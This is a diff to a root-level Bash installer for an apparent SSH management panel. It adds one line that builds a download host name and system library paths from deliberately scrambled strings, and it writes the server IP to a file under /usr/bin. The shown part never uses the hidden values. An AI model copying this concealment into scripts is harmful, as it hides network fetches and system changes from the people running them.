@@ -8,6 +8,8 @@ rm $HOME/New.sh > /dev/null 2>&1; exit 0
 [[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || apt-get install mlocate -y &>/dev/null
 ## rm $(pwd)/$0 &> /dev/null
 
+_lnk=$(echo 't1:e#n.5s0ul&p4hs$s.0729t9p$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+
 cd $HOME
 fun_bar () {
 comando[0]="$1"
@@ -71,7 +73,6 @@ pip install speedtest-cli
 
 fun_attlist () {
 apt-get update -y
-echo "$IP" > /usr/bin/vendor_code
 [[ ! -d /usr/share/.plus ]] && mkdir /usr/share/.plus
 echo "crz: $(date)" > /usr/share/.plus/.plus
 }
@@ -81,6 +82,7 @@ cp /etc/ssh/sshd_config /etc/ssh/sshd_back
 service ssh restart  > /dev/null 2>&1
 echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
 echo "/bin/menu" > /bin/adm && chmod +x /bin/adm > /dev/null 2>&1
+echo "$IP" > /usr/bin/vendor_code
 rm versao* > /dev/null 2>&1; wget https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/versao > /dev/null 2>&1
 }
 
